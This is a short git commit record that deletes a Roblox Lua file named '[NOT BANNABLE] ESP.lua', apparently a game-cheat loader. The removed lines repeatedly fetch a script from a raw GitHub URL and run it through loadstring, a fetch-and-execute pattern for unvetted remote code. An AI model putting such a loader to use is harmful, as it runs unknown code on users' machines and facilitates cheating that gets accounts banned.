c764775c3e0232e0167f34091d8063f9515bd226
vert <138340159+verttables@users.noreply.github.com>
2025-05-11 22:07:01 -0700

    Delete [NOT BANNABLE] ESP.lua

--- [NOT BANNABLE] ESP.lua
+++
@@ -1,5 +0,0 @@
-while true do
-  wait(1)
-  print("CurseHub")
-loadstring(gameHttpGet(('https://raw.githubusercontent.com/Alexander0969/CurseHub/main/%5Bdont%20use%20it%20is%20bannable%5DESP.lua')))()
-end
